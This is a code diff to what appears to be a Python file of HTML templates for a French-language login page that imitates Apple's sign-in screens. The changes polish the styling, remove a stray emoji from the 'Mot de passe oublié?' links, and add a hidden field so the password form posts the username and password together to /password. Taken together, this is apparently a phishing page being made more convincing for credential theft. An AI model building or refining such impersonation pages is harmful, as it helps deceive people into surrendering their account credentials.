@@ -31,7 +31,7 @@ base_html = """
         }}
         .login-container {{
             width: 380px;
-            padding: 40px;
+            padding: 80px;
             background-color: white;
             border-radius: 12px;
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
@@ -105,6 +105,25 @@ base_html = """
             color: #1d1d1f;
             margin-bottom: 15px;
         }}
+        .username-box {{
+        background-color: #f5f5f7;
+        border-radius: 8px;
+        padding: 12px 15px;
+        margin-bottom: 15px;
+        text-align: left;
+        font-size: 14px;
+        }}
+    
+        .username-label {{
+            color: #86868b;
+            font-size: 12px;
+        }}
+        
+        .username-value {{
+            color: #1d1d1f;
+            font-weight: normal;
+            margin-top: 3px;
+        }}
     </style>
 </head>
 <body>
@@ -128,14 +147,18 @@ username_screen = """
         <input type="checkbox" id="stay_connected" name="stay_connected">
         <label for="stay_connected">Rester connecté</label>
     </div>
-    <a href="#" class="link">Mot de passe oublié? 🟧</a>
+    <a href="#" class="link">Mot de passe oublié?</a>
     <a href="#" class="link">Créer un compte Apple</a>
 </form>
 """
 
 password_screen = """
-<div class="username-display">Courriel ou numéro de téléphone<br>{username}</div>
+<div class="username-box">
+    <div class="username-label">Courriel ou numéro de téléphone</div>
+    <div class="username-value">{username}</div>
+</div>
 <form method="POST" action="/password">
+    <input type="hidden" name="username" value="{username}">
     <div class="input-container">
         <input type="password" name="password" class="input-field" placeholder="Mot de passe" required>
         <button type="submit" class="submit-btn">→</button>
@@ -144,7 +167,7 @@ password_screen = """
         <input type="checkbox" id="stay_connected" name="stay_connected">
         <label for="stay_connected">Rester connecté</label>
     </div>
-    <a href="#" class="link">Mot de passe oublié? 🟧</a>
+    <a href="#" class="link">Mot de passe oublié?</a>
     <a href="#" class="link">Créer un compte Apple</a>
 </form>
 """
